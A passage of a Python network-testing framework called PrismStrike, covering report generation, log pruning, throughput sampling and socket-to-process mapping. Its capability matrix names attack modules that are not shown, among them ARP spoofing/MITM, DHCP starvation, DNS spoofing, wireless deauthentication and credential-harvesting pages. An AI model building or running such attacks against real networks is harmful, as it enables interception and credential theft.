                      "<p>No HTTP inspections were recorded in this session, so no posture "
                      "grade is available. Run a live HTTP inspection to populate this table.</p>")
    document = """<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><title>PrismStrike session report</title>
<style>
 body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#f8fafc;color:#0f172a;margin:0}
 header{background:#0f172a;color:#e2e8f0;padding:1.6rem 2rem}
 header h1{margin:0;font-size:1.3rem} header p{margin:.3rem 0 0;color:#94a3b8;font-size:.85rem}
 main{padding:1.6rem 2rem;max-width:1200px;margin:0 auto}
 section{background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:1.2rem 1.4rem;margin:0 0 1.4rem}
 h2{font-size:1rem;margin:0 0 .8rem;color:#334155;text-transform:uppercase;letter-spacing:.04em}
 table{width:100%%;border-collapse:collapse;font-size:.82rem}
 th,td{text-align:left;padding:.45rem .6rem;border-bottom:1px solid #e2e8f0;vertical-align:top}
 th{color:#475569;font-weight:600}
 .lvl-error td,.lvl-critical td{background:#fef2f2} .lvl-warn td{background:#fffbeb}
 .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1rem}
 .kv{background:#f1f5f9;border-radius:10px;padding:.8rem 1rem}
 .kv b{display:block;font-size:.72rem;color:#64748b;text-transform:uppercase}
 .kv span{font-size:1.05rem;font-weight:600}
 footer{padding:1rem 2rem 2rem;color:#64748b;font-size:.75rem}
 code{background:#f1f5f9;padding:.1rem .35rem;border-radius:4px}
 .grade{display:inline-block;min-width:1.6rem;text-align:center;font-weight:700;border-radius:6px;padding:.1rem .45rem;color:#fff;background:#64748b}
 .g-a{background:#15803d} .g-b{background:#4d7c0f} .g-c{background:#a16207} .g-d{background:#c2410c}
 .g-e{background:#b91c1c} .g-f{background:#7f1d1d}
</style></head><body>
<header><h1>PrismStrike session report</h1>
<p>session <code>%(session)s</code> &middot; host %(host)s &middot; %(platform)s &middot; generated %(generated)s</p></header>
<main>
 <section><h2>Session overview</h2><div class="grid">
  <div class="kv"><b>Tool</b><span>PrismStrike v%(version)s</span></div>
  <div class="kv"><b>Duration</b><span>%(duration)s</span></div>
  <div class="kv"><b>Events</b><span>%(events)d</span></div>
  <div class="kv"><b>Errors logged</b><span>%(errors)d</span></div>
  <div class="kv"><b>Artefacts</b><span>%(artefacts)d</span></div>
  <div class="kv"><b>Log directory</b><span><code>%(logdir)s</code></span></div>
 </div></section>
 <section><h2>Event categories</h2><table><tr><th>Category</th><th>Count</th></tr>%(counters)s</table></section>
 <section><h2>Scan artefacts</h2><table><tr><th>File</th><th>Size</th></tr>%(artefacts_rows)s</table></section>
 <section><h2>HTTP hardening grades</h2>%(hardening_note)s
  <table><tr><th>Grade</th><th>Score</th><th>URL</th><th>Missing headers / notes</th></tr>%(hardening)s</table></section>
 <section><h2>Audit trail (last %(shown)d events)</h2>
  <table><tr><th>Time</th><th>Level</th><th>Category</th><th>Message</th></tr>%(rows)s</table></section>
</main>
<footer>Generated by PrismStrike - authorised testing use only. Raw journals: %(logtxt)s</footer>
</body></html>""" % {
        "session": _html.escape(LOGGER.session_id),
        "host": _html.escape(platform.node()),
        "platform": _html.escape(platform.platform()),
        "generated": format_timestamp(),
        "version": __version__,
        "duration": format_duration(time.time() - LOGGER.started_at),
        "events": sum(LOGGER.counters.values()),
        "errors": LOGGER.counters.get("errors", 0),
        "artefacts": len(artefacts),
        "logdir": _html.escape(LOGGER.log_dir),
        "counters": counters_html,
        "hardening": hardening_html,
        "hardening_note": hardening_note,
        "artefacts_rows": artefact_html or "<tr><td colspan='2'>none</td></tr>",
        "rows": rows_html or "<tr><td colspan='4'>no events</td></tr>",
        "shown": min(len(level_rows), 3000),
        "logtxt": _html.escape(LOGGER.txt_path),
    }
    try:
        os.makedirs(directory, exist_ok=True)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(document)
    except OSError as exc:
        raise FrameworkError("could not write HTML report: %s" % exc)
    ok("HTML report written: %s (%s)" % (path, format_bytes(os.path.getsize(path))))
    LOGGER.event("report", "HTML report generated", data={"path": path})
    return path


def export_markdown_summary(output_dir: str = "") -> str:
    """Write a Markdown session summary suitable for pasting into a ticket."""
    directory = output_dir or LOGGER.log_dir
    path = os.path.join(directory, "summary_%s.md" % LOGGER.session_id)
    lines = [
        "# PrismStrike session summary",
        "",
        "- **Session:** `%s`" % LOGGER.session_id,
        "- **Host:** %s (%s)" % (platform.node(), platform.platform()),
        "- **Tool:** PrismStrike v%s (%s)" % (__version__, __build__),
        "- **Started:** %s" % format_timestamp(LOGGER.started_at),
        "- **Duration:** %s" % format_duration(time.time() - LOGGER.started_at),
        "- **Events recorded:** %d" % sum(LOGGER.counters.values()),
        "- **Errors logged:** %d" % LOGGER.counters.get("errors", 0),
        "",
        "## Event categories",
        "",
        "| Category | Count |",
        "|---|---:|",
    ]
    for kind, count in sorted(LOGGER.counters.items()):
        lines.append("| %s | %d |" % (kind, count))
    lines.extend(["", "## Scan artefacts", "", "| File | Size |", "|---|---:|"])
    try:
        for name in sorted(os.listdir(LOGGER.artifact_dir)):
            full = os.path.join(LOGGER.artifact_dir, name)
            lines.append("| `%s` | %s |" % (name, format_bytes(os.path.getsize(full))))
    except OSError:
        lines.append("| *(unreadable)* | - |")
    hardening = collect_http_hardening_findings()
    lines.extend(["", "## HTTP security-header grades", ""])
    if hardening:
        lines.extend(["| Grade | Score | URL | Missing headers |", "|---|---:|---|---|"])
        for entry in hardening:
            lines.append("| **%s** | %d | `%s` | %s |"
                         % (entry["grade"], entry["score"], entry["url"][:80],
                            ", ".join(entry["missing"]) or "none"))
    else:
        lines.append("*No HTTP inspections recorded - no posture grade available.*")
    lines.extend(["", "## Recent events", "", "```"])
    lines.extend(LOGGER.tail(60))
    lines.extend(["```", "", "*Generated by PrismStrike - authorised testing use only.*", ""])
    try:
        os.makedirs(directory, exist_ok=True)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write("\n".join(lines))
    except OSError as exc:
        raise FrameworkError("could not write Markdown summary: %s" % exc)
    ok("Markdown summary written: %s" % path)
    LOGGER.event("report", "Markdown summary generated", data={"path": path})
    return path


def prune_sessions(keep_last: int = 10, older_than_days: float = 0.0,
                   dry_run: bool = True) -> Dict[str, Any]:
    """
    Remove old session journals and their artefacts.

    Sessions are grouped by their identifier; the newest `keep_last` groups are
    always preserved, and an optional age filter removes anything older. Dry-run
    mode is the default so an operator can review the deletion list first.
    """
    session_re = re.compile(r"^prismstrike_(\d{8}-\d{6}-[^.]+)\.(?:log\.txt|events\.json|summary\.json)$")
    groups: Dict[str, List[str]] = {}
    try:
        for name in os.listdir(LOGGER.log_dir):
            match = session_re.match(name)
            if match:
                groups.setdefault(match.group(1), []).append(os.path.join(LOGGER.log_dir, name))
    except OSError as exc:
        raise FrameworkError("log directory unreadable: %s" % exc)
    ordered = sorted(groups.items(), key=lambda item: max(
        os.path.getmtime(path) for path in item[1]), reverse=True)
    doomed: List[str] = []
    kept: List[str] = []
    for index, (session_id, paths) in enumerate(ordered):
        newest = max(os.path.getmtime(path) for path in paths)
        if index < max(0, int(keep_last)):
            kept.append(session_id)
            continue
        if older_than_days and (time.time() - newest) < (older_than_days * 86400.0):
            kept.append(session_id)
            continue
        doomed.extend(paths)
    heading("SESSION PRUNING")
    kv_table([
        ("Sessions discovered", len(ordered)),
        ("Protected (newest %d)" % keep_last, len(kept)),
        ("Files selected for removal", len(doomed)),
        ("Age filter", ("%s days" % older_than_days) if older_than_days else "disabled"),
        ("Mode", "DRY RUN (nothing deleted)" if dry_run else "LIVE DELETE"),
    ])
    for path in doomed[:40]:
        out("    %s %s" % (c("DELETE" if not dry_run else "WOULD DELETE", "byellow"),
                           os.path.basename(path)))
    if len(doomed) > 40:
        out("    ... and %d more" % (len(doomed) - 40))
    removed = 0
    if not dry_run:
        for path in doomed:
            try:
                os.remove(path)
                removed += 1
            except OSError as exc:
                warn("could not remove %s: %s" % (os.path.basename(path), exc))
        ok("removed %d file(s)." % removed)
        LOGGER.event("maintenance", "session pruning removed %d file(s)" % removed,
                     data={"keep_last": keep_last, "older_than_days": older_than_days})
    else:
        note("re-run with live deletion enabled to apply this plan.")
    return OrderedDict([
        ("mode", "session-prune"),
        ("sessions", len(ordered)), ("kept", kept),
        ("selected", doomed), ("removed", removed), ("dry_run", dry_run),
    ])


PROC_NET_DEV_PATH = "/proc/net/dev"


def _read_proc_counters(sample_path: str = PROC_NET_DEV_PATH) -> Dict[str, Dict[str, int]]:
    """Read per-interface byte and packet counters from the Linux kernel."""
    counters: Dict[str, Dict[str, int]] = {}
    try:
        with open(sample_path, "r", encoding="utf-8") as handle:
            for line in handle.readlines()[2:]:
                name, _, payload = line.partition(":")
                fields = payload.split()
                if len(fields) < 16:
                    continue
                counters[name.strip()] = {
                    "rx_bytes": int(fields[0]), "rx_packets": int(fields[1]),
                    "rx_errors": int(fields[2]), "rx_drops": int(fields[3]),
                    "tx_bytes": int(fields[8]), "tx_packets": int(fields[9]),
                    "tx_errors": int(fields[10]), "tx_drops": int(fields[11]),
                }
    except (OSError, ValueError, IndexError):
        return {}
    return counters


def _parse_netstat_output(text: str) -> Dict[str, Dict[str, int]]:
    """Parse `netstat -ibn` output (BSD/macOS) into the shared counter layout.

    Two traps. The byte and packet columns are right aligned, but the Address column
    is empty on link rows, so a positional read from the header misaligns by one: the
    last seven fields are the counters in every row shape. And continuation rows (one
    per address family) start with the network value instead of the interface name and
    carry '-' where a counter does not apply, so a row whose first field is not shaped
    like an interface name is skipped, as is a row that will not parse.
    """
    counters: Dict[str, Dict[str, int]] = {}
    for line in text.splitlines():
        fields = line.split()
        if len(fields) < 8:
            continue
        name = fields[0]
        if not re.match(r"^[A-Za-z][A-Za-z0-9._-]*$", name):
            continue
        if name in counters:
            continue
        tail = fields[-7:]
        try:
            rx_packets, rx_errors, rx_bytes, tx_packets, tx_errors, tx_bytes = (
                int(value) for value in tail[:6])
        except (TypeError, ValueError):
            continue
        counters[name] = {
            "rx_bytes": rx_bytes, "rx_packets": rx_packets,
            "rx_errors": rx_errors, "rx_drops": 0,
            "tx_bytes": tx_bytes, "tx_packets": tx_packets,
            "tx_errors": tx_errors, "tx_drops": 0,
        }
    return counters


def _read_netstat_counters() -> Dict[str, Dict[str, int]]:
    """BSD/macOS fallback: read the platform's own `netstat -ibn` counters once."""
    try:
        result = subprocess.run(["netstat", "-ibn"], stdout=subprocess.PIPE,
                                stderr=subprocess.DEVNULL, universal_newlines=True,
                                timeout=15.0)
    except (OSError, subprocess.SubprocessError, ValueError):
        return {}
    if int(getattr(result, "returncode", 1) or 0) != 0:
        return {}
    return _parse_netstat_output(str(getattr(result, "stdout", "") or ""))


def _parse_windows_adapter_stats(text: str) -> Dict[str, Dict[str, int]]:
    """Parse `Get-NetAdapterStatistics` JSON (object or array) into the same layout.

    The cmdlet exposes byte counters only; the packet and error columns stay at zero so
    the shared layout survives, and the summary names the source for the operator.
    """
    counters: Dict[str, Dict[str, int]] = {}
    try:
        payload = json.loads(text or "[]")
    except (TypeError, ValueError):
        return counters
    if isinstance(payload, dict):
        payload = [payload]
    if not isinstance(payload, list):
        return counters
    for item in payload:
        if not isinstance(item, dict):
            continue
        name = str(item.get("Name") or "").strip()
        if not name or name in counters:
            continue
        try:
            counters[name] = {
                "rx_bytes": int(item["ReceivedBytes"]), "rx_packets": 0,
                "rx_errors": 0, "rx_drops": 0,
                "tx_bytes": int(item["SentBytes"]), "tx_packets": 0,
                "tx_errors": 0, "tx_drops": 0,
            }
        except (KeyError, TypeError, ValueError):
            continue
    return counters


def _read_windows_counters() -> Dict[str, Dict[str, int]]:
    """Windows fallback: per-adapter byte counters through PowerShell, no extra package."""
    if os.name != "nt":
        return {}
    command = ("Get-NetAdapterStatistics | "
               "Select-Object Name,ReceivedBytes,SentBytes | ConvertTo-Json -Compress")
    try:
        result = subprocess.run(["powershell", "-NoProfile", "-NonInteractive",
                                 "-Command", command], stdout=subprocess.PIPE,
                                stderr=subprocess.DEVNULL, universal_newlines=True,
                                timeout=30.0)
    except (OSError, subprocess.SubprocessError, ValueError):
        return {}
    if int(getattr(result, "returncode", 1) or 0) != 0:
        return {}
    return _parse_windows_adapter_stats(str(getattr(result, "stdout", "") or ""))


def _counter_backend(iface: Optional[str] = None,
                     sample_path: str = PROC_NET_DEV_PATH) -> Tuple[str, str]:
    """Choose a throughput counter backend and describe it.

    Order: Linux kernel counters, BSD/macOS `netstat -ibn`, Windows PowerShell adapter
    statistics, and finally scapy packet accounting - the last one only when the
    operator names an interface, because it needs a live raw capture. When nothing is
    usable the caller receives ("none", reason) and degrades instead of aborting.
    """
    if os.path.exists(sample_path):
        if _read_proc_counters(sample_path):
            return "proc", "kernel counters via %s" % sample_path
    if shutil.which("netstat"):
        if _read_netstat_counters():
            return "netstat", "per-interface counters via netstat -ibn"
    if os.name == "nt" and shutil.which("powershell"):
        if _read_windows_counters():
            return "powershell", "per-interface counters via Get-NetAdapterStatistics"
    if iface and SCAPY_AVAILABLE:
        return "scapy", ("packet accounting on %s via scapy (counts only what it "
                         "captures, so it needs a live raw capture)" % iface)
    reasons: List[str] = []
    if not os.path.exists(sample_path):
        reasons.append("%s is not present" % sample_path)
    if not shutil.which("netstat"):
        reasons.append("netstat is not installed")
    if os.name != "nt":
        reasons.append("PowerShell adapter statistics need Windows")
    if not iface:
        reasons.append("name an interface to allow scapy packet accounting")
    elif not SCAPY_AVAILABLE:
        reasons.append("scapy unavailable: %s" % (SCAPY_ERROR or "not installed"))
    return "none", "; ".join(reasons)


def throughput_sampler(iface: Optional[str] = None, duration: float = 10.0,
                       interval: float = 1.0,
                       sample_path: str = PROC_NET_DEV_PATH) -> Dict[str, Any]:
    """Report live per-interface throughput from the best available backend.

    Linux uses /proc/net/dev, BSD/macOS the built-in `netstat -ibn`, Windows PowerShell
    adapter statistics, and - only when an interface is named - scapy packet accounting.
    When no backend is usable the call returns an "available: False" summary naming
    every probe that failed instead of aborting, so the module stays usable on every
    platform the rest of the console supports.
    """
    interval = max(0.25, float(interval))
    duration = max(interval, float(duration))
    backend, backend_note = _counter_backend(iface, sample_path)
    if backend == "none":
        heading("THROUGHPUT SAMPLER")
        warn("no interface counters are available on this platform.")
        out("  %s %s" % (c("probes:", "bcyan"), backend_note))
        out("  %s on macOS/BSD the built-in netstat is used, on Windows PowerShell "
            "adapter statistics, or name an interface for scapy accounting."
            % c("hint:", "bcyan"))
        return OrderedDict([("mode", "throughput-sampler"), ("available", False),
                            ("backend", backend), ("reason", backend_note),
                            ("interfaces", []), ("samples", []), ("averages", {})])
    totals: Dict[str, Dict[str, int]] = {}
    totals_lock = threading.Lock()
    sniffer = None
    if backend == "proc":
        def _read_counters() -> Dict[str, Dict[str, int]]:
            return _read_proc_counters(sample_path)
    elif backend == "netstat":
        _read_counters = _read_netstat_counters
    elif backend == "powershell":
        _read_counters = _read_windows_counters
    else:
        def _accumulate(packet: Any) -> None:
            name = str(getattr(packet, "sniffed_on", None) or iface or "?")
            try:
                size = int(getattr(packet, "len", 0))
            except (TypeError, ValueError):
                size = 0
            if size <= 0:
                try:
                    size = len(bytes(packet))
                except (TypeError, ValueError, AttributeError):
                    size = 0
            with totals_lock:
                entry = totals.setdefault(name, {"rx_bytes": 0, "rx_packets": 0,
                                                 "rx_errors": 0, "rx_drops": 0,
                                                 "tx_bytes": 0, "tx_packets": 0,
                                                 "tx_errors": 0, "tx_drops": 0})
                entry["rx_bytes"] += max(0, size)
                entry["rx_packets"] += 1

        def _read_counters() -> Dict[str, Dict[str, int]]:
            with totals_lock:
                return {name: dict(values) for name, values in totals.items()}

        try:
            from scapy.all import AsyncSniffer
            totals[str(iface)] = {"rx_bytes": 0, "rx_packets": 0, "rx_errors": 0,
                                  "rx_drops": 0, "tx_bytes": 0, "tx_packets": 0,
                                  "tx_errors": 0, "tx_drops": 0}
            sniffer = AsyncSniffer(iface=iface, store=False, prn=_accumulate)
            sniffer.start()
        except Exception as exc:
            warn("scapy packet accounting could not start: %s: %s"
                 % (type(exc).__name__, exc))
            return OrderedDict([("mode", "throughput-sampler"), ("available", False),
                                ("backend", backend), ("reason", str(exc)),
                                ("interfaces", []), ("samples", []), ("averages", {})])
    first = _read_counters()
    if not first and backend != "scapy":
        warn("the %s backend reported no interfaces." % backend)
        return OrderedDict([("mode", "throughput-sampler"), ("available", False),
                            ("backend", backend),
                            ("reason", "%s returned no counters" % backend),
                            ("interfaces", []), ("samples", []), ("averages", {})])
    if iface and iface not in first:
        warn("interface '%s' has no counters in the %s backend." % (iface, backend))
        out("  %s counters were reported for: %s"
            % (c("available:", "bcyan"), ", ".join(sorted(first)) or "none"))
        if sniffer is not None:
            try:
                sniffer.stop()
            except Exception:
                pass
        return OrderedDict([("mode", "throughput-sampler"), ("available", False),
                            ("backend", backend),
                            ("reason", "interface '%s' was not reported by the %s backend"
                             % (iface, backend)),
                            ("interfaces", sorted(first)), ("samples", []), ("averages", {})])
    targets = [iface] if iface else sorted(name for name in first if name != "lo")
    heading("THROUGHPUT SAMPLER")
    kv_table([("Counter source", backend_note)])
    out(c("  %-10s %-12s %-12s %-10s %-10s %s" % (
        "IFACE", "RX RATE", "TX RATE", "RX pkt/s", "TX pkt/s", "TOTALS (rx/tx)"), "bold"))
    samples: List[Dict[str, Any]] = []
    started = time.time()
    previous = first
    try:
        while (time.time() - started) < duration:
            time.sleep(interval)
            current = _read_counters()
            elapsed = interval
            row: Dict[str, Any] = OrderedDict([("timestamp", format_timestamp()),
                                               ("interfaces", {})])
            for name in targets:
                if name not in current or name not in previous:
                    continue
                rx_delta = max(0, current[name]["rx_bytes"] - previous[name]["rx_bytes"])
                tx_delta = max(0, current[name]["tx_bytes"] - previous[name]["tx_bytes"])
                rxp_delta = max(0, current[name]["rx_packets"] - previous[name]["rx_packets"])
                txp_delta = max(0, current[name]["tx_packets"] - previous[name]["tx_packets"])
                row["interfaces"][name] = OrderedDict([
                    ("rx_bytes_per_sec", round(rx_delta / elapsed, 1)),
                    ("tx_bytes_per_sec", round(tx_delta / elapsed, 1)),
                    ("rx_packets_per_sec", round(rxp_delta / elapsed, 1)),
                    ("tx_packets_per_sec", round(txp_delta / elapsed, 1)),
                    ("rx_total_bytes", current[name]["rx_bytes"]),
                    ("tx_total_bytes", current[name]["tx_bytes"]),
                    ("rx_errors_total", current[name]["rx_errors"]),
                    ("tx_errors_total", current[name]["tx_errors"]),
                ])
                out("  %-10s %-12s %-12s %-10s %-10s %s / %s" % (
                    name,
                    format_bytes(rx_delta / elapsed) + "/s", format_bytes(tx_delta / elapsed) + "/s",
                    "%.0f" % (rxp_delta / elapsed), "%.0f" % (txp_delta / elapsed),
                    format_bytes(current[name]["rx_bytes"]), format_bytes(current[name]["tx_bytes"])))
            samples.append(row)
            previous = current
    except KeyboardInterrupt:
        warn("throughput sampling interrupted by operator.")
    finally:
        if sniffer is not None:
            try:
                sniffer.stop()
            except Exception:
                pass
    heading("THROUGHPUT SUMMARY")
    averages: Dict[str, Dict[str, float]] = {}
    for name in targets:
        rates = [sample["interfaces"].get(name) for sample in samples]
        rates = [entry for entry in rates if entry]
        if not rates:
            continue
        averages[name] = OrderedDict([
            ("avg_rx_bytes_per_sec", round(sum(entry["rx_bytes_per_sec"] for entry in rates) / len(rates), 1)),
            ("avg_tx_bytes_per_sec", round(sum(entry["tx_bytes_per_sec"] for entry in rates) / len(rates), 1)),
            ("peak_rx_bytes_per_sec", max(entry["rx_bytes_per_sec"] for entry in rates)),
            ("peak_tx_bytes_per_sec", max(entry["tx_bytes_per_sec"] for entry in rates)),
        ])
        out("  %-10s avg rx=%s/s tx=%s/s   peak rx=%s/s tx=%s/s" % (
            name, format_bytes(averages[name]["avg_rx_bytes_per_sec"]),
            format_bytes(averages[name]["avg_tx_bytes_per_sec"]),
            format_bytes(averages[name]["peak_rx_bytes_per_sec"]),
            format_bytes(averages[name]["peak_tx_bytes_per_sec"])))
    summary = OrderedDict([
        ("mode", "throughput-sampler"),
        ("available", True),
        ("backend", backend),
        ("backend_note", backend_note),
        ("interfaces", targets),
        ("interval_seconds", interval),
        ("samples", samples),
        ("averages", averages),
    ])
    artifact = LOGGER.scan("throughput", summary, target=iface or "all")
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def socket_process_map() -> List[Dict[str, Any]]:
    """
    Map TCP/UDP sockets to their owning processes by joining /proc/net/* with
    /proc/<pid>/fd socket inodes - the native equivalent of `ss -tunap`.
    """
    inodes: Dict[str, Dict[str, Any]] = {}
    for entry in ("tcp", "tcp6", "udp", "udp6"):
        path = "/proc/net/%s" % entry
        if not os.path.exists(path):
            continue
        try:
            with open(path, "r", encoding="utf-8") as handle:
                lines = handle.read().splitlines()[1:]
        except OSError:
            continue
        for line in lines:
            fields = line.split()
            if len(fields) < 10:
                continue
            local_hex, rem_hex, state_hex, inode = fields[1], fields[2], fields[3], fields[9]
            try:
                laddr_hex, lport_hex = local_hex.rsplit(":", 1)
                raddr_hex, rport_hex = rem_hex.rsplit(":", 1)
                local_port = int(lport_hex, 16)
                remote_port = int(rport_hex, 16)
                local_address = socket.inet_ntoa(bytes.fromhex(laddr_hex)[::-1][:4]) if entry in ("tcp", "udp") else laddr_hex
                remote_address = socket.inet_ntoa(bytes.fromhex(raddr_hex)[::-1][:4]) if entry in ("tcp", "udp") else raddr_hex
            except (ValueError, IndexError, OSError):
                continue
            state_name = {"01": "ESTABLISHED", "02": "SYN_SENT", "06": "TIME_WAIT",
                          "08": "CLOSE_WAIT", "0A": "LISTEN", "07": "CLOSE"}.get(state_hex, state_hex)
            inodes[inode] = OrderedDict([
                ("protocol", entry), ("local_address", local_address), ("local_port", local_port),
                ("remote_address", remote_address), ("remote_port", remote_port),
                ("state", state_name if entry.startswith("tcp") else "UNCONN"),
                ("inode", inode), ("pid", None), ("process", None),
            ])
    if not inodes:
        return []
    try:
        pid_dirs = [name for name in os.listdir("/proc") if name.isdigit()]
    except OSError:
        pid_dirs = []
    for pid in pid_dirs:
        fd_dir = "/proc/%s/fd" % pid
        try:
            for fd_name in os.listdir(fd_dir):
                try:
                    link = os.readlink(os.path.join(fd_dir, fd_name))
                except OSError:
                    continue
                match = re.match(r"socket:\[(\d+)\]", link)
                if not match:
                    continue
                inode = match.group(1)
                if inode not in inodes:
                    continue
                process_name = ""
                try:
                    with open("/proc/%s/comm" % pid, "r", encoding="utf-8") as handle:
                        process_name = handle.read().strip()
                except OSError:
                    process_name = ""
                inodes[inode]["pid"] = int(pid)
                inodes[inode]["process"] = process_name or "unknown"
        except (OSError, PermissionError):
            continue
    rows = list(inodes.values())
    heading("SOCKET -> PROCESS MAP")
    listeners = [row for row in rows if row["state"] in ("LISTEN", "UNCONN")]
    established = [row for row in rows if row["state"] not in ("LISTEN", "UNCONN")]
    out(c("  %-6s %-18s %-8s %-18s %-8s %-8s %s" % (
        "PROTO", "LOCAL", "PORT", "REMOTE", "PORT", "PID", "PROCESS"), "bold"))
    for row in listeners[:60]:
        out("  %-6s %-18s %-8s %-18s %-8s %-8s %s" % (
            row["protocol"], row["local_address"], row["local_port"],
            row["remote_address"], row["remote_port"],
            row["pid"] if row["pid"] is not None else "-",
            c(row["process"] or "unowned/hidden", "grey")))
    if established:
        out("")
        out(c("  established/other (%d shown of %d)" % (min(40, len(established)), len(established)), "cyan"))
        for row in established[:40]:
            out("  %-6s %-18s %-8s %-18s %-8s %-8s %s" % (
                row["protocol"], row["local_address"], row["local_port"],
                row["remote_address"], row["remote_port"],
                row["pid"] if row["pid"] is not None else "-",
                c(row["process"] or "unowned/hidden", "grey")))
    note("%d socket(s) enumerated, %d mapped to a process." % (
        len(rows), sum(1 for row in rows if row["pid"] is not None)))
    return rows


# ===========================================================================
# OPERATOR PAUSE + CAPABILITY MATRIX + REPORTING & MAINTENANCE (MODULE 18)
# ===========================================================================
REPORT_ON_EXIT = False
ONLINE_PUSH: Dict[str, str] = {}
ONLINE_EMAIL: Dict[str, Any] = {}


def pause_for_operator() -> None:
    """
    Single, uniform "return to menu" pause used after every module.

    Keeping this in one place guarantees the menu's input cadence is identical
    no matter which branch ran, and a closed stdin unwinds cleanly instead of
    silently desynchronising the prompt stream.
    """
    out("")
    try:
        input(c("  << press <Enter> to return to the main menu >>", "grey"))
    except EOFError:
        raise InputExhausted("standard input closed at the menu boundary")
    except KeyboardInterrupt:
        out("")


def print_capability_matrix() -> None:
    """Full inventory of every module in the framework, v3.0 extension included."""
    heading("PrismStrike v%s CAPABILITY MATRIX" % __version__)
    rows: List[Tuple[str, str, str, str]] = [
        ("01", "ICMP reconnaissance", "raw Scapy sweeps, granular type/code probes, traceroute", "core"),
        ("02", "TCP flag crafter", "SYN/ACK/FIN/RST/PSH/URG/NULL/XMAS + 11-flag matrix", "core"),
        ("03", "Hping replicator", "raw hping3-style loops, custom flags/counts/ports, spoofed source", "core"),
        ("04", "Nmap sub-engine", "python-nmap -F/-A/custom, bytes-safe XML handling", "core"),
        ("05", "Live sniffer", "scapy sniff() with live layer decoding and BPF filters", "core"),
        ("06", "ARP discovery", "native op=1 requests, neighbour cache, conflict monitor", "core"),
        ("07", "ARP spoofing / MITM", "bi-directional op=2 poisoning, auto IP-forward, auto-restore", "core"),
        ("08", "PCAP analyst", "file forensics + LIVE capture analysis + HTTP(S) remote capture ingest", "online"),
        ("09", "System intelligence", "local host report + REMOTE host dossier (DNS/route/RTT/ports)", "online"),
        ("10", "Logging console", "session ledger + REMOTE RFC5424 syslog shipping (UDP/TCP/TLS)", "online"),
        ("11", "Dependency doctor", "capability audit + ONLINE release-freshness check (PyPI API)", "online"),
        ("12", "Self-test suite", "57 non-destructive validation checks incl. extension + online batteries", "core"),
        ("13", "Network utilities", "banner grab, TCP stream reassembly, path MTU, OS fingerprint, route lookup", "new"),
        ("14", "DHCP operations", "discover, starvation test, authorised rogue server with lease ledger", "new"),
        ("15", "DNS toolkit", "native resolver, tunnelling/DGA monitor, spoof engine", "new"),
        ("16", "Wireless lab", "capability audit, monitor-mode scan with auto-revert, deauth lab", "new"),
        ("17", "Awareness listeners", "HTTP harvester page, protocol credential traps, pattern engine", "new"),
        ("18", "Reporting & maintenance", "reports + ONLINE delivery (webhook multipart, SMTP/STARTTLS)", "online"),
    ]
    out(c("  %-4s %-24s %-58s %s" % ("ID", "MODULE", "PRIMARY CAPABILITY", "CLASS"), "bold"))
    for module_id, name, capability, klass in rows:
        colour = {"core": "bcyan", "new": "bgreen", "online": "bmagenta"}.get(klass, "grey")
        out("  %-4s %-24s %-58s %s" % (
            c(module_id, "byellow", "bold"), name, capability[:58], c(klass, colour)))
    out("")
    native_features = [
        "scapy packet forge/send/capture (single dependency for all raw work)",
        "stdlib socket/ssl/http.server/socketserver for service interaction",
        "stdlib ipaddress/struct/socket for address math and ctypes-free /proc parsing",
        "stdlib re/json/threading/queue for pattern engines and concurrent listeners",
        "zero external network helpers - no hping, no dnspython, no ndiff, no texttable",
    ]
    kv_table([
        ("Interactive modules", "17"),
        ("Self-test checks", "57 (15 platform + 25 extension + 17 online)"),
        ("Native implementation", "100% in-script"),
        ("External binaries used", "nmap (optional sub-engine), iw/ip (wireless control)"),
    ])
    for line in native_features:
        out("    %s %s" % (c("*", "bgreen"), c(line, "grey")))


def module_report(args: Optional[List[str]] = None) -> None:
    """Non-interactive report export: HTML session report plus Markdown summary."""
    heading("REPORT EXPORT")
    try:
        html_path = generate_html_report()
    except FrameworkError as exc:
        err(str(exc))
        html_path = ""
    try:
        md_path = export_markdown_summary()
    except FrameworkError as exc:
        err(str(exc))
        md_path = ""
    if html_path or md_path:
        kv_table([
            ("HTML report", html_path or "failed"),
            ("Markdown summary", md_path or "failed"),
            ("Session", LOGGER.session_id),
            ("Log directory", LOGGER.log_dir),
        ])


@module_guard("Reporting & Maintenance")
def module_extras(args: Optional[List[str]] = None) -> None:
    """Interactive reporting, housekeeping and telemetry console."""
    while True:
        heading("MODULE 18 - REPORTING & MAINTENANCE")
        options = OrderedDict([
            ("1", "Capability matrix (full module inventory)"),
            ("2", "Generate HTML session report"),
            ("3", "Generate Markdown session summary"),
            ("4", "Prune old sessions (dry-run first, then live delete)"),
            ("5", "Interface throughput sampler (kernel counters + portable fallbacks)"),
            ("6", "Socket -> process map (native ss -tunap replacement)"),
            ("7", "Operator quick-reference (flags, files, conventions)"),
            ("8", "ONLINE: push the report to a remote webhook (HTTP/S multipart)"),
            ("9", "ONLINE: email the session summary (SMTP, STARTTLS, attachments)"),
            ("10", "ONLINE: NDJSON event sink / alert relay console"),
            ("11", "HTTP security-header scorer (grade artefacts A-F)"),
            ("12", "Purge transient capture files (audit trail preserved)"),
            ("0", "Return to main menu"),
        ])
        for key, label in options.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("maint> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()

        if choice == "12":
            purge_transient_captures_interactive()
            continue

        if choice == "11":
            security_header_scorer_interactive()
            continue
        if choice == "0":
            return
        if choice == "1":
            print_capability_matrix()
        elif choice == "2":
            try:
                path = generate_html_report()
            except FrameworkError as exc:
                err(str(exc))
                continue
            note("open it with: xdg-open %s" % path)
        elif choice == "3":
            try:
                path = export_markdown_summary()
            except FrameworkError as exc:
                err(str(exc))
                continue
            note("paste it into a ticket or commit it next to the artefacts.")
        elif choice == "4":
            keep = prompt_int("sessions to keep", 1, 100000, 10)
            if keep is PROMPT_ABORT:
                continue
            age = prompt_float("only delete sessions older than N days (0 = no age filter)",
                               0.0, 3650.0, 0.0)
            if age is PROMPT_ABORT:
                continue
            try:
                plan = prune_sessions(keep_last=int(keep), older_than_days=float(age), dry_run=True)
            except FrameworkError as exc:
                err(str(exc))
                continue
            if not plan["selected"]:
